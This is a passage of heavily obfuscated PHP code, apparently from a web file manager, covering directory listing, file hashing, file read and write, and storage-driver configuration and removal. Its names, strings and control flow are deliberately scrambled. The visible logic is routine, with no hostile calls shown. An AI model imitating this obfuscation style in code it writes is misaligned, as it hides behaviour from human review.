if (is_file($Dë³æ‚å©Æ)) { $CŞÃáçˆ£Ë[$cÊ¤§Ç³„¶[78]]++; $CŞÃáçˆ£Ë[$cÊ¤§Ç³„¶[77]] += (double) abs(sprintf($cÊ¤§Ç³„¶[1153], @filesize($Dë³æ‚å©Æ))); } else { $CŞÃáçˆ£Ë[$cÊ¤§Ç³„¶[79]]++; $this->infoChildren($Dë³æ‚å©Æ, $CŞÃáçˆ£Ë, !1); } } closedir($a¥Ú¯…½èÈ); } private function folderInfo($bÑ—†Ò»…, $DÛŠó†éºê = false) { $cªø¥Î =& $_SERVER[Ö¹ñÒÁ²÷]; $bÑ—†Ò»… = rtrim($bÑ—†Ò»…, $cªø¥Î[8]) . $cªø¥Î[8]; $B‰‚›šµá‡ = $this->iconvApp($this->pathThis($bÑ—†Ò»…)); if ($DÛŠó†éºê) { return array($cªø¥Î[28] => $B‰‚›šµá‡, $cªø¥Î[75] => $this->getPathOuter($bÑ—†Ò»…), $cªø¥Î[29] => $cªø¥Î[76]); } $c¼¬ÃáÜ›ù = array($cªø¥Î[28] => $B‰‚›šµá‡, $cªø¥Î[75] => $this->getPathOuter($bÑ—†Ò»…), $cªø¥Î[29] => $cªø¥Î[76], $cªø¥Î[183] => @filectime($bÑ—†Ò»…), $cªø¥Î[106] => @filemtime($bÑ—†Ò»…), $cªø¥Î[1154] => @fileatime($bÑ—†Ò»…), $cªø¥Î[1148] => is_readable($bÑ—†Ò»…), $cªø¥Î[1149] => is_writable($bÑ—†Ò»…), $cªø¥Î[1155] => get_mode($bÑ—†Ò»…)); return $c¼¬ÃáÜ›ù; } private function fileInfo($E©‰›Ú¬¶§, $eÉ­¿³Ü’ = false) { $B«´Ã×¢ºØ =& $_SERVER[Ö¹ñÒÁ²÷]; $fÇ›†ŒÚ±¾ = $this->iconvApp($this->pathThis($E©‰›Ú¬¶§)); if ($eÉ­¿³Ü’) { return array($B«´Ã×¢ºØ[28] => $fÇ›†ŒÚ±¾, $B«´Ã×¢ºØ[75] => $this->getPathOuter($E©‰›Ú¬¶§), $B«´Ã×¢ºØ[29] => $B«´Ã×¢ºØ[163], $B«´Ã×¢ºØ[77] => $this->size($E©‰›Ú¬¶§), $B«´Ã×¢ºØ[156] => $this->ext($fÇ›†ŒÚ±¾)); } $Fì÷‚’èô = array($B«´Ã×¢ºØ[28] => $fÇ›†ŒÚ±¾, $B«´Ã×¢ºØ[75] => $this->getPathOuter($E©‰›Ú¬¶§), $B«´Ã×¢ºØ[29] => $B«´Ã×¢ºØ[163], $B«´Ã×¢ºØ[183] => @filectime($E©‰›Ú¬¶§), $B«´Ã×¢ºØ[106] => @filemtime($E©‰›Ú¬¶§), $B«´Ã×¢ºØ[1154] => @fileatime($E©‰›Ú¬¶§), $B«´Ã×¢ºØ[77] => $this->size($E©‰›Ú¬¶§), $B«´Ã×¢ºØ[156] => $this->ext($fÇ›†ŒÚ±¾), $B«´Ã×¢ºØ[1148] => is_readable($E©‰›Ú¬¶§), $B«´Ã×¢ºØ[1149] => is_writable($E©‰›Ú¬¶§), $B«´Ã×¢ºØ[1155] => get_mode($E©‰›Ú¬¶§)); return $Fì÷‚’èô; } public function exist($F†’´Ÿõ) { $F†’´Ÿõ = $this->iconvSystem($F†’´Ÿõ); return @file_exists($F†’´Ÿõ); } public function isFile($A­Ò¥¶­Â©) { $A­Ò¥¶­Â© = $this->iconvSystem($A­Ò¥¶­Â©); return @is_file($A­Ò¥¶­Â©); } public function isFolder($c”„ôÎË°á) { $c”„ôÎË°á = $this->iconvSystem($c”„ôÎË°á); return @is_dir($c”„ôÎË°á); } public function listPath($b¤Š›ª¿Ó’, $Bõ•Ş£Ä¦¢ = false) { goto E”Æ‰¶àÃ·; E”Æ‰¶àÃ·: $EÌ©¯­’¤ =& $_SERVER[Ö¹ñÒÁ²÷]; $b¤Š›ª¿Ó’ = $this->iconvSystem($b¤Š›ª¿Ó’); $b¤Š›ª¿Ó’ = rtrim($b¤Š›ª¿Ó’, $EÌ©¯­’¤[8]) . $EÌ©¯­’¤[8]; goto EÏä«‡¬˜’; EÏä«‡¬˜’: $d§ß»ŒÖñ = array($EÌ©¯­’¤[74] => array(), $EÌ©¯­’¤[73] => array()); if (!($CÅšº²ìâí = @opendir($b¤Š›ª¿Ó’))) { return $d§ß»ŒÖñ; } while (($DÅ½²Ÿªçê = readdir($CÅšº²ìâí)) !== !1) { if ($DÅ½²Ÿªçê == $EÌ©¯­’¤[91] || $DÅ½²Ÿªçê == $EÌ©¯­’¤[1151]) { continue; } $AÀíåÕ = $b¤Š›ª¿Ó’ . $DÅ½²Ÿªçê; if (is_file($AÀíåÕ)) { $d§ß»ŒÖñ[$EÌ©¯­’¤[73]][] = $this->fileInfo($AÀíåÕ, $Bõ•Ş£Ä¦¢); } else { $d§ß»ŒÖñ[$EÌ©¯­’¤[74]][] = $this->folderInfo($AÀíåÕ, $Bõ•Ş£Ä¦¢); } } goto cœ¼¼¯çšÂ; cœ¼¼¯çšÂ: closedir($CÅšº²ìâí); return $d§ß»ŒÖñ; goto fÁí¸ÜÁêÓ; fÁí¸ÜÁêÓ: } public function listAll($E© ‰· Ëß, &$CâŸŞŒøÃ¿ = array()) { goto FÕÕóÇØ¹Ì; d¥øÇ‡‘©İ: return $CâŸŞŒøÃ¿; goto E†ÌŠ¬Øìß; FÕÕóÇØ¹Ì: $C•„ˆ±Ğéò =& $_SERVER[Ö¹ñÒÁ²÷]; $E© ‰· Ëß = $this->iconvSystem($E© ‰· Ëß); $E© ‰· Ëß = rtrim($E© ‰· Ëß, $C•„ˆ±Ğéò[8]) . $C•„ˆ±Ğéò[8]; goto E•Üè˜‰‹ˆ; E•Üè˜‰‹ˆ: if (!($E’¨ô„Ê‡¯ = @opendir($E© ‰· Ëß))) { return $CâŸŞŒøÃ¿; } while (($E¤¾¦‚ÂøÛ = readdir($E’¨ô„Ê‡¯)) !== !1) { if ($E¤¾¦‚ÂøÛ == $C•„ˆ±Ğéò[91] || $E¤¾¦‚ÂøÛ == $C•„ˆ±Ğéò[1151]) { continue; } $e˜Üø›Í› = $E© ‰· Ëß . $E¤¾¦‚ÂøÛ; if (is_dir($e˜Üø›Í›)) { $CâŸŞŒøÃ¿[] = array($C•„ˆ±Ğéò[75] => $e˜Üø›Í› . $C•„ˆ±Ğéò[8], $C•„ˆ±Ğéò[76] => 1, $C•„ˆ±Ğéò[106] => @filemtime($e˜Üø›Í›), $C•„ˆ±Ğéò[77] => 0); $this->listAll($e˜Üø›Í›, $CâŸŞŒøÃ¿); } else { $CâŸŞŒøÃ¿[] = array($C•„ˆ±Ğéò[75] => $e˜Üø›Í›, $C•„ˆ±Ğéò[76] => 0, $C•„ˆ±Ğéò[106] => @filemtime($e˜Üø›Í›), $C•„ˆ±Ğéò[77] => $this->size($e˜Üø›Í›)); } } closedir($E’¨ô„Ê‡¯); goto d¥øÇ‡‘©İ; E†ÌŠ¬Øìß: } public function has($D•ïº—Ì, $FÑËª×Ç = false, $E¡ ïÜŒ®• = true) { goto b„±ê¯ŸÃ‰; b„±ê¯ŸÃ‰: $AÊ¼æ‚ğÑ =& $_SERVER[Ö¹ñÒÁ²÷]; $D•ïº—Ì = $this->iconvSystem($D•ïº—Ì); $D•ïº—Ì = rtrim($D•ïº—Ì, $AÊ¼æ‚ğÑ[8]) . $AÊ¼æ‚ğÑ[8]; goto b›ˆ¾¶‰‚á; b›ˆ¾¶‰‚á: if (!($Aâƒ¶§ò’Â = @opendir($D•ïº—Ì))) { return !1; } $DšíØ³·ÙÖ = 0; $bÄÜ¾Í³‹„ = 0; goto bÖå³Ì‰‡; EØ­íË ÊÜ: return !1; goto d»²ÏÑ®³; bÖå³Ì‰‡: while (($Eï»§ÌõÎÜ = readdir($Aâƒ¶§ò’Â)) !== !1) { if ($Eï»§ÌõÎÜ == $AÊ¼æ‚ğÑ[91] || $Eï»§ÌõÎÜ == $AÊ¼æ‚ğÑ[1151]) { continue; } $A¶Ö¶×±× = $D•ïº—Ì . $Eï»§ÌõÎÜ; if ($FÑËª×Ç) { if (@is_file($A¶Ö¶×±×)) { $DšíØ³·ÙÖ++; } else { $bÄÜ¾Í³‹„++; } continue; } if ($E¡ ïÜŒ®•) { if (@is_file($A¶Ö¶×±×)) { return !0; } } else { if (@is_dir($A¶Ö¶×±× . $AÊ¼æ‚ğÑ[8])) { return !0; } } } closedir($Aâƒ¶§ò’Â); if ($FÑËª×Ç) { return array($AÊ¼æ‚ğÑ[187] => $DšíØ³·ÙÖ, $AÊ¼æ‚ğÑ[188] => $bÄÜ¾Í³‹„); } goto EØ­íË ÊÜ; d»²ÏÑ®³: } public function hashSimple($aÚ¸¥‹š—Í) { goto bƒè‘†µ Ğ; D‡ƒÚİŒç: fseek($eÛÈ“ØÎ¾÷, $FÈ¬¾¸²Ó‰ - $Dß¦ŠŞğêÃ); $dŞÂÇ‹•“Â .= fread($eÛÈ“ØÎ¾÷, $Dß¦ŠŞğêÃ); fclose($eÛÈ“ØÎ¾÷); goto f‹Å³ŠŒ´Ï; A±ŞÒÒÍéÑ: $eÛÈ“ØÎ¾÷ = fopen($aÚ¸¥‹š—Í, $D½¹’³Ù–œ[1156]); if (!$eÛÈ“ØÎ¾÷) { return $dŞÂÇ‹•“Â; } for ($F‰Ï”Êƒ›À = 0; $F‰Ï”Êƒ›À < $eƒŠØ²Ìİ; $F‰Ï”Êƒ›À++) { fseek($eÛÈ“ØÎ¾÷, $eó— µ±½Ò * $F‰Ï”Êƒ›À); $dŞÂÇ‹•“Â .= fread($eÛÈ“ØÎ¾÷, $Dß¦ŠŞğêÃ); } goto D‡ƒÚİŒç; d—ç«¿³ïÀ: $FÈ¬¾¸²Ó‰ = $this->size($aÚ¸¥‹š—Í); $Dß¦ŠŞğêÃ = 200; $eƒŠØ²Ìİ = 50; goto dÏƒ‰©àÖÖ; dÏƒ‰©àÖÖ: if ($FÈ¬¾¸²Ó‰ <= $Dß¦ŠŞğêÃ * $eƒŠØ²Ìİ) { return $this->hashMd5($aÚ¸¥‹š—Í) . $FÈ¬¾¸²Ó‰; } $dŞÂÇ‹•“Â = $D½¹’³Ù–œ[33]; $eó— µ±½Ò = intval($FÈ¬¾¸²Ó‰ / $eƒŠØ²Ìİ); goto A±ŞÒÒÍéÑ; bƒè‘†µ Ğ: $D½¹’³Ù–œ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$aÚ¸¥‹š—Í) { return md5($D½¹’³Ù–œ[33]); } $aÚ¸¥‹š—Í = $this->iconvSystem($aÚ¸¥‹š—Í); goto d—ç«¿³ïÀ; f‹Å³ŠŒ´Ï: return md5($dŞÂÇ‹•“Â) . $FÈ¬¾¸²Ó‰; goto d…×¾¢™ï¥; d…×¾¢™ï¥: } public function getContent($AÈÍÏê¡…·) { $AÈÍÏê¡…· = $this->iconvSystem($AÈÍÏê¡…·); return file_get_contents($AÈÍÏê¡…·); } public function setContent($F…¬ÍóÓ©Ò, $fè‘‹Ÿª”ö = '') { $F…¬ÍóÓ©Ò = $this->iconvSystem($F…¬ÍóÓ©Ò); @file_put_contents($F…¬ÍóÓ©Ò, $fè‘‹Ÿª”ö, LOCK_EX); clearstatcache(); return strlen($fè‘‹Ÿª”ö) == filesize($F…¬ÍóÓ©Ò); } public function fileSubstr($D‡“‚õ“¹, $fÑÏãÌÔÌ = 0, $CÒ¹“¡­‡§ = false) { goto cÆäŞ„£Ìá; a•“ã‘‹Ü¹: if ($CÒ¹“¡­‡§ <= 0) { return $d¤¶ÙÎŞ°µ[33]; } $AİÙÄ³Ïî– = fopen($D‡“‚õ“¹, $d¤¶ÙÎŞ°µ[1156]); if (!$AİÙÄ³Ïî–) { return !1; } goto CùÊŒ¨©¢; B“ÒÙ§·…§: return $aæÛ·ô‘–; goto dµ°©À£õ‘; CùÊŒ¨©¢: fseek($AİÙÄ³Ïî–, $fÑÏãÌÔÌ); $aæÛ·ô‘– = fread($AİÙÄ³Ïî–, $CÒ¹“¡­‡§); fclose($AİÙÄ³Ïî–); goto B“ÒÙ§·…§; cÆäŞ„£Ìá: $d¤¶ÙÎŞ°µ =& $_SERVER[Ö¹ñÒÁ²÷]; $D‡“‚õ“¹ = $this->iconvSystem($D‡“‚õ“¹); if ($CÒ¹“¡­‡§ === !1) { $CÒ¹“¡­‡§ = $this->size($D‡“‚õ“¹); } goto a•“ã‘‹Ü¹; dµ°©À£õ‘: } public function upload($CÚŒÙÃîğ—, $E©Æ¨©½£œ, $D¤‡ã†ëİ‹ = false, $FäŸõë¢‚  = REPEAT_REPLACE) { $F†…×¦¾ù– = $this->copyFile($E©Æ¨©½£œ, $CÚŒÙÃîğ—); return $F†…×¦¾ù– ? $this->getPathOuter($CÚŒÙÃîğ—) : !1; } public function download($BÊä—¸Ö¤, $C»ŒÍÀÛø›) { return $this->iconvSystem($BÊä—¸Ö¤); } } goto FÍ¤—¹è›Û; f†‚ñêº›õ: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\163\x74\157\162\x61\x67\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\163\151\x7a\145\115\x61\x78", "\x73\171\x73\164\x65\x6d", "\x64\145\146\x61\165\x6c\164", "\144\x72\x69\x76\145\162", "\143\157\x6e\x66\151\x67"); public function listData($Dµï ˜•¯ = false, $A¼Á‹…Ã¨¸ = "\155\157\x64\151\146\171\124\151\155\x65", $FÕÔäÛô¶Ô = false) { goto e£°±¨»ÙÖ; c…‡Õ­¡Ä×: foreach ($fáÆŞ¾ÒÃ± as $C±öáñ­å¦ => $añ¸İ¬äîÙ) { unset($fáÆŞ¾ÒÃ±[$C±öáñ­å¦][$a“Ú¬ñŠ¬”[6]]); $fáÆŞ¾ÒÃ±[$C±öáñ­å¦][$a“Ú¬ñŠ¬”[2065]] = 0; } $D‡Ç„è± = array_to_keyvalue($fáÆŞ¾ÒÃ±, $a“Ú¬ñŠ¬”[33], $a“Ú¬ñŠ¬”[363]); $this->_listAppendSize($fáÆŞ¾ÒÃ±, $D‡Ç„è±); goto CœºËØ„†§; CœºËØ„†§: return $fáÆŞ¾ÒÃ±; goto EôÈÃ‘»”; e£°±¨»ÙÖ: $a“Ú¬ñŠ¬” =& $_SERVER[Ö¹ñÒÁ²÷]; $fáÆŞ¾ÒÃ± = parent::listData($Dµï ˜•¯, $A¼Á‹…Ã¨¸, $FÕÔäÛô¶Ô); if ($Dµï ˜•¯) { return $fáÆŞ¾ÒÃ±; } goto c…‡Õ­¡Ä×; EôÈÃ‘»”: } public function _listAppendSize(&$A’Ÿí‰µ®, $BçİÍ…‘­º) { $CºÕä—“› =& $_SERVER[Ö¹ñÒÁ²÷]; $A•ÇÛ£¡Ô‘ = $CºÕä—“›[2339] . implode($CºÕä—“›[47], $BçİÍ…‘­º) . $CºÕä—“›[2340]; $fÀ¦‘à¨‘ = Model($CºÕä—“›[716])->query($A•ÇÛ£¡Ô‘); $fÀ¦‘à¨‘ = array_to_keyvalue($fÀ¦‘à¨‘, $CºÕä—“›[363], $CºÕä—“›[77]); foreach ($A’Ÿí‰µ® as $e™¯‰ö†‚ => $d¯Ô†™ğ) { $A’Ÿí‰µ®[$e™¯‰ö†‚][$CºÕä—“›[2065]] = isset($fÀ¦‘à¨‘[$d¯Ô†™ğ[$CºÕä—“›[363]]]) ? $fÀ¦‘à¨‘[$d¯Ô†™ğ[$CºÕä—“›[363]]] : 0; } } public function getConfig($Fô½Æ§£‚½) { $fŒ¬Ò‡­Ô´ = parent::listData($Fô½Æ§£‚½); return json_decode($fŒ¬Ò‡­Ô´[$_SERVER[Ö¹ñÒÁ²÷][6]], !0); } public function update($FºÒ­á¾»÷, $B™õØŸ©œ) { goto aÁİÏÄÙÇ’; B¶¯§í©Ÿµ: $bçºáÄÕŸ = parent::update($FºÒ­á¾»÷, $B™õØŸ©œ); if ($bçºáÄÕŸ && $B™õØŸ©œ[$AŠïµ±²Ö[34]]) { foreach ($DÅ‡¶æñ÷Ğ as $A•¢è Ñ·Œ) { if ($A•¢è Ñ·Œ[$AŠïµ±²Ö[34]] && $A•¢è Ñ·Œ[$AŠïµ±²Ö[363]] != $FºÒ­á¾»÷) { parent::update($A•¢è Ñ·Œ[$AŠïµ±²Ö[363]], array($AŠïµ±²Ö[34] => 0)); } } } return $bçºáÄÕŸ; goto A®ËÆ®±ˆ«; aÁİÏÄÙÇ’: $AŠïµ±²Ö =& $_SERVER[Ö¹ñÒÁ²÷]; $FÑ¸“ôÃ = $B™õØŸ©œ[$AŠïµ±²Ö[28]]; $DÅ‡¶æñ÷Ğ = array_to_keyvalue(parent::listData(), $AŠïµ±²Ö[28]); goto Fœ‚—êŒÀĞ; Fœ‚—êŒÀĞ: if (isset($DÅ‡¶æñ÷Ğ[$FÑ¸“ôÃ]) && $DÅ‡¶æñ÷Ğ[$FÑ¸“ôÃ][$AŠïµ±²Ö[363]] != $FºÒ­á¾»÷) { return !1; } if (isset($B™õØŸ©œ[$AŠïµ±²Ö[2341]]) && $B™õØŸ©œ[$AŠïµ±²Ö[2341]] == $AŠïµ±²Ö[83]) { $this->checkConfig($B™õØŸ©œ); } unset($B™õØŸ©œ[$AŠïµ±²Ö[2341]]); goto B¶¯§í©Ÿµ; A®ËÆ®±ˆ«: } public function add($c¦¨ •‡—¢) { goto CÅ¨¼˜ŒŞ; CÅ¨¼˜ŒŞ: $DŸ¸Ññ™±¢ =& $_SERVER[Ö¹ñÒÁ²÷]; $eÓæÔÜ—íŸ = array_to_keyvalue(parent::listData(), $DŸ¸Ññ™±¢[28]); if (isset($eÓæÔÜ—íŸ[$c¦¨ •‡—¢[$DŸ¸Ññ™±¢[28]]])) { return !1; } goto c¸é¥³Ô‚è; c¸é¥³Ô‚è: $this->checkConfig($c¦¨ •‡—¢); $b¿Èë±Ğ›« = parent::insert($c¦¨ •‡—¢); if ($b¿Èë±Ğ›« && $c¦¨ •‡—¢[$DŸ¸Ññ™±¢[34]]) { foreach ($eÓæÔÜ—íŸ as $bŠŠ‹êÜÆ) { if ($bŠŠ‹êÜÆ[$DŸ¸Ññ™±¢[34]]) { parent::update($bŠŠ‹êÜÆ[$DŸ¸Ññ™±¢[363]], array($DŸ¸Ññ™±¢[34] => 0)); } } } goto eòñ”ô¥¥; eòñ”ô¥¥: return $b¿Èë±Ğ›«; goto F•›†è¾â; F•›†è¾â: } public function checkConfig(&$fËŒÊ™«¡›) { goto a‰™àÛßÇ±; B‹ÄÚòù¥ƒ: $d¿‚³›‰‚ = $câ§©¶‹ğ„->getPath($E±Æäâ˜ . $B›ĞŠ²ŒÄ[1961]); if (!$câ§©¶‹ğ„->mkfile($d¿‚³›‰‚)) { show_json(LNG($B›ĞŠ²ŒÄ[2342]), !1); } $E‘Î—œò‡É[$B›ĞŠ²ŒÄ[1018]] = $E±Æäâ˜; goto c§á–™ôô; c§á–™ôô: $fËŒÊ™«¡›[$B›ĞŠ²ŒÄ[6]] = json_encode($E‘Î—œò‡É); $fËŒÊ™«¡›[$B›ĞŠ²ŒÄ[90]] = $bõÂÜƒ’; return !0; goto c®Ì” †‰¼; a‰™àÛßÇ±: $B›ĞŠ²ŒÄ =& $_SERVER[Ö¹ñÒÁ²÷]; $B²õÚÏª ª = strtolower($fËŒÊ™«¡›[$B›ĞŠ²ŒÄ[90]]); $E‘Î—œò‡É = json_decode($fËŒÊ™«¡›[$B›ĞŠ²ŒÄ[6]], !0); goto b™Şè—êßë; eâÚ®·£ï±: $b„öŒ°ä’› = $B›ĞŠ²ŒÄ[71] . $bõÂÜƒ’; $câ§©¶‹ğ„ = new $b„öŒ°ä’›($E‘Î—œò‡É); if (in_array($B²õÚÏª ª, $câ§©¶‹ğ„->objectDriver)) { if (!$câ§©¶‹ğ„->isBucketCors() && !$câ§©¶‹ğ„->setBucketCors()) { $f£­Ï¢‰¡´ = LNG($B›ĞŠ²ŒÄ[2342]); $f£­Ï¢‰¡´ .= $B›ĞŠ²ŒÄ[2343] . LNG($B›ĞŠ²ŒÄ[2344]); show_json($f£­Ï¢‰¡´, !1); } } goto B‹ÄÚòù¥ƒ; b™Şè—êßë: foreach ($E‘Î—œò‡É as $EÎçÖîâÈ¤ => $bÊå¡İŒ¾›) { $E‘Î—œò‡É[$EÎçÖîâÈ¤] = trim($bÊå¡İŒ¾›); } $E±Æäâ˜ = rtrim($E‘Î—œò‡É[$B›ĞŠ²ŒÄ[1018]], $B›ĞŠ²ŒÄ[8]) . $B›ĞŠ²ŒÄ[8]; $bõÂÜƒ’ = $this->driverType($B²õÚÏª ª); goto eâÚ®·£ï±; c®Ì” †‰¼: } private function driverType($Dõ¢™”Şç) { $EĞ™Ã¨Æ =& $_SERVER[Ö¹ñÒÁ²÷]; $Bã£ƒÚÄ¿æ = array($EĞ™Ã¨Æ[101] => $EĞ™Ã¨Æ[2345], $EĞ™Ã¨Æ[58] => $EĞ™Ã¨Æ[2346], $EĞ™Ã¨Æ[64] => $EĞ™Ã¨Æ[2347]); if (isset($Bã£ƒÚÄ¿æ[$Dõ¢™”Şç])) { return $Bã£ƒÚÄ¿æ[$Dõ¢™”Şç]; } return strtoupper($Dõ¢™”Şç); } public function driverListSystem() { $Eº©Áõ´ÜÛ =& $_SERVER[Ö¹ñÒÁ²÷]; $fô™Á‘˜—í = parent::listData(); $bÅğˆ¾ğËÔ = array(); foreach ($fô™Á‘˜—í as $dĞ–³ËôãÖ) { unset($dĞ–³ËôãÖ[$Eº©Áõ´ÜÛ[183]], $dĞ–³ËôãÖ[$Eº©Áõ´ÜÛ[106]]); $dĞ–³ËôãÖ[$Eº©Áõ´ÜÛ[6]] = json_decode($dĞ–³ËôãÖ[$Eº©Áõ´ÜÛ[6]], !0); $bÅğˆ¾ğËÔ[] = $dĞ–³ËôãÖ; } return $bÅğˆ¾ğËÔ; } public function defaultDriver() { $dˆ„çŠ„„ª =& $_SERVER[Ö¹ñÒÁ²÷]; $dâíÑ©ÎÄ = parent::listData(); $eŠ·Ÿ‚®İï = array_filter_by_field($dâíÑ©ÎÄ, $dˆ„çŠ„„ª[34], 1); $eŠ·Ÿ‚®İï = $eŠ·Ÿ‚®İï[0]; if ($eŠ·Ÿ‚®İï) { $eŠ·Ÿ‚®İï[$dˆ„çŠ„„ª[6]] = json_decode($eŠ·Ÿ‚®İï[$dˆ„çŠ„„ª[6]], !0); } return $eŠ·Ÿ‚®İï; } public function driverInfo($Dö‰²ŞÈ²§) { $cÅò§ÁãÛ =& $_SERVER[Ö¹ñÒÁ²÷]; $d¥¦èëÊ° = array_to_keyvalue(parent::listData(), $cÅò§ÁãÛ[363]); if (!isset($d¥¦èëÊ°[$Dö‰²ŞÈ²§])) { return !1; } $fì´“­Ë¸‚ = $d¥¦èëÊ°[$Dö‰²ŞÈ²§]; $fì´“­Ë¸‚[$cÅò§ÁãÛ[6]] = json_decode($fì´“­Ë¸‚[$cÅò§ÁãÛ[6]], !0); return $fì´“­Ë¸‚; } public function remove($CˆŠÚô¬Ôô) { $this->removeShareItems($CˆŠÚô¬Ôô); return parent::remove($CˆŠÚô¬Ôô); } public function removeWithFile($bÌÅœ„‘ê†) { goto Fö³ÒÅå†; AÎó‘·Í : $B¢äå³±á = Model($c‹Æ¨·ï¼À[418])->where($Fç»‡¯—îë)->sum($c‹Æ¨·ï¼À[77]); $CÜµ‹ë¤óÒ = $c‹Æ¨·ï¼À[2348] . $bÌÅœ„‘ê†; $D¼£¹Œ±ë = new TaskFileTransfer($CÜµ‹ë¤óÒ, $c‹Æ¨·ï¼À[2349], $C¦èØ»â„­, LNG($c‹Æ¨·ï¼À[2350]) . "\50{$bÌÅœ„‘ê†}\51"); goto DÕ¥¡í; DÕ¥¡í: $D¼£¹Œ±ë->task[$c‹Æ¨·ï¼À[695]] = (double) $B¢äå³±á; $b¿‰¾¬ùŒ¥ = KodIO::defaultDriver(); $f³ÚŸ‡½¹ = $b¿‰¾¬ùŒ¥[$c‹Æ¨·ï¼À[363]]; goto A¥‹àÉ¶ è; DÕ……ßáœ³: if (!$c·¶œö±¬) { $D¼£¹Œ±ë->stop($CÜµ‹ë¤óÒ); return !1; } $D¼£¹Œ±ë->end(); $this->remove($bÌÅœ„‘ê†); goto CÍº‚â¹í; a‚è°ñÍÊ: $AˆÃ™Ì¼Š› = Model($c‹Æ¨·ï¼À[163])->where($Fç»‡¯—îë)->field($c‹Æ¨·ï¼À[2351])->select(); foreach ($AˆÃ™Ì¼Š› as $fì«£¸¹) { goto C·Ìó­Úí¦; eŒ‚«Şª—: if (IO::exist($dˆ”‡ØÙŠÌ)) { $D¼£¹Œ±ë->updateFileEnd($fì«£¸¹[$c‹Æ¨·ï¼À[28]], $fì«£¸¹[$c‹Æ¨·ï¼À[77]]); continue; } if (!IO::move($dĞãÕì”¾, get_path_father($dˆ”‡ØÙŠÌ))) { $c·¶œö±¬ = !1; break; } $Fç»‡¯—îë = array($c‹Æ¨·ï¼À[415] => $fì«£¸¹[$c‹Æ¨·ï¼À[415]]); goto aÚ¿ó÷£†–; aÚ¿ó÷£†–: $EáµŠ¹Ø¯ = array($c‹Æ¨·ï¼À[740] => $f³ÚŸ‡½¹, $c‹Æ¨·ï¼À[75] => $dˆ”‡ØÙŠÌ); Model($c‹Æ¨·ï¼À[163])->where($Fç»‡¯—îë)->save($EáµŠ¹Ø¯); goto c“ÊæŸš¹°; C·Ìó­Úí¦: $dĞãÕì”¾ = $fì«£¸¹[$c‹Æ¨·ï¼À[75]]; $dˆ”‡ØÙŠÌ = $f½×í‰ƒ² . str_replace("\x7b\x69\x6f\72{$bÌÅœ„‘ê†}\x7d\x2f", $c‹Æ¨·ï¼À[33], $dĞãÕì”¾); if (!IO::exist($dĞãÕì”¾)) { $cÎá¢œÌ‘­[] = $fì«£¸¹[$c‹Æ¨·ï¼À[415]]; $D¼£¹Œ±ë->updateFileEnd($fì«£¸¹[$c‹Æ¨·ï¼À[28]], $fì«£¸¹[$c‹Æ¨·ï¼À[77]]); continue; } goto eŒ‚«Şª—; c“ÊæŸš¹°: } $this->removeByFileID($cÎá¢œÌ‘­); goto DÕ……ßáœ³; Fö³ÒÅå†: $c‹Æ¨·ï¼À =& $_SERVER[Ö¹ñÒÁ²÷]; $Fç»‡¯—îë = array($c‹Æ¨·ï¼À[740] => $bÌÅœ„‘ê†); $C¦èØ»â„­ = Model($c‹Æ¨·ï¼À[418])->where($Fç»‡¯—îë)->count(); goto AÎó‘·Í ; A¥‹àÉ¶ è: $f½×í‰ƒ² = "\x7b\x69\x6f\72{$f³ÚŸ‡½¹}\x7d\57"; $c·¶œö±¬ = !0; $cÎá¢œÌ‘­ = array(); goto a‚è°ñÍÊ; CÍº‚â¹í: } public function progress($D®Ø²ºÂ™) { return Task::get($_SERVER[Ö¹ñÒÁ²÷][2348] . $D®Ø²ºÂ™); } private function removeByFileID($c°»¬ªë¥Ï = array()) { goto A–ƒÊò†â±; FÇÓ¤¡¼Ä±: foreach ($C„†Œñ¦‘Ò as $bÅ–¦ÚõƒÌ) { Model($cÑÔøî‰¦Í[378])->removeNow($bÅ–¦ÚõƒÌ, !1); } goto fæÆ¼õ Á³; EµÜœæ·ùˆ: $C„†Œñ¦‘Ò = Model($cÑÔøî‰¦Í[1104])->where($Cøµ’ç‘Ñ)->field($cÑÔøî‰¦Í[365])->select(); if (!$C„†Œñ¦‘Ò) { return; } $C„†Œñ¦‘Ò = array_to_keyvalue($C„†Œñ¦‘Ò, $cÑÔøî‰¦Í[33], $cÑÔøî‰¦Í[365]); goto FÇÓ¤¡¼Ä±; A–ƒÊò†â±: $cÑÔøî‰¦Í =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($c°»¬ªë¥Ï)) { return; } $Cøµ’ç‘Ñ = array($cÑÔøî‰¦Í[415] => array($cÑÔøî‰¦Í[7], $c°»¬ªë¥Ï)); goto EµÜœæ·ùˆ; fæÆ¼õ Á³: } private function removeShareItems($d›Ã¶÷‚®) { goto F‘ëÕÏ”¼Ù; F‘ëÕÏ”¼Ù: $cœÚíÙ«˜¢ =& $_SERVER[Ö¹ñÒÁ²÷]; $aÃ¬ô»‘¬ = "\173\x69\x6f\x3a{$d›Ã¶÷‚®}\x7d\57"; $D•‡ÎƒÎ « = array($cœÚíÙ«˜¢[365] => 0, $cœÚíÙ«˜¢[1012] => array($cœÚíÙ«˜¢[748], "{$aÃ¬ô»‘¬}\x25")); goto EÔ§‰Ôîªœ; fÆë´À¿¡†: Model($cœÚíÙ«˜¢[532])->remove($D½«Ó£Ü); goto AäÆÖ”’™„; EÔ§‰Ôîªœ: $AºÈà„Õó = Model($cœÚíÙ«˜¢[2056])->where($D•‡ÎƒÎ «)->field($cœÚíÙ«˜¢[437])->select(); if (empty($AºÈà„Õó)) { return; } $D½«Ó£Ü = array_to_keyvalue($AºÈà„Õó, $cœÚíÙ«˜¢[33], $cœÚíÙ«˜¢[437]); goto fÆë´À¿¡†; AäÆÖ”’™„: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\114\151\x67\150\x74\x41\x70\160"; public $modelType = "\123\x79\163\x74\145\x6d\117\160\164\151\x6f\156"; public $field = array("\x6e\141\155\x65", "\x67\162\157\x75\160", "\144\145\163\x63", "\143\157\x6e\x74\x65\x6e\x74"); public function listData($C¿–ÂŠŒç× = false, $BÍÁå¿öğ = "\x6d\157\x64\151\146\x79\124\x69\155\x65", $aÑÜ®Œ‚ê = true) { return parent::listData($C¿–ÂŠŒç×, $BÍÁå¿öğ, $aÑÜ®Œ‚ê); } public function remove($EÆÇ½º²–) { $aùÖĞ¼ = $this->findByName($EÆÇ½º²–); if (!$aùÖĞ¼) { return !1; } return 